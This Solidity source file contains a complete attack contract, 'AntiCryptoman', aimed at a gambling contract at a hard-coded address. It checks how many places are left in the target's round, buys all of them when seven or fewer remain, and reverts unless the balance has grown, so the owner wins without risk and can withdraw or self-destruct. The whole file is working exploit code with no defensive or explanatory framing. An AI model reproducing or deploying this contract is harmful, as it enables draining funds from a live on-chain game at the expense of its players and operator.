pragma solidity ^0.5.0;

interface TargetInterface {
    function placesLeft() external view returns (uint256);
}

contract AntiCryptoman {
    
    address payable targetAddress = 0x1Ef48854c57126085c2C9615329ED71fe159E390;
    address payable private owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    function ping(bool _toOwner) public payable onlyOwner {
        TargetInterface target = TargetInterface(targetAddress);
        uint256 placesLeft = target.placesLeft();
        
        require(placesLeft <= 7);
        
        uint256 betSize = 0.05 ether;
        uint256 ourBalanceInitial = address(this).balance;
        
        for (uint256 ourBetIndex = 0; ourBetIndex < placesLeft; ourBetIndex++) {
            (bool success, bytes memory data) = targetAddress.call.value(betSize)("");
            require(success);
            data;
        }
        
        require(address(this).balance > ourBalanceInitial);
        
        if (_toOwner) {
            owner.transfer(address(this).balance);
        }
    }
    
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }    
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }    
    
    function () external payable {
    }
    
}